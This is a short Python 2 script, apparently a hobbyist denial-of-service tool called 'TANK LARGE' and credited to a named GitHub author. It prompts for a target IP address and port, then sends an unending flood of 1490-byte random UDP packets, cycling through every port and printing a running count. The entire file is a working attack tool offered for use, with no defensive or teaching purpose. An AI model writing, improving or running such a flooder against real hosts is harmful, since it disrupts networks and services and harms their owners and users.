import sys
import os
import time
import socket
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet TANK LARGE")
print
print "Author   : AJDAREmmi"
print "Github   : https://github.com/AJDAREmmi"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print "Attack Starting ??? "
time.sleep(5)
print "Attack Started! - AJDAREmmi!"
time.sleep(5)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

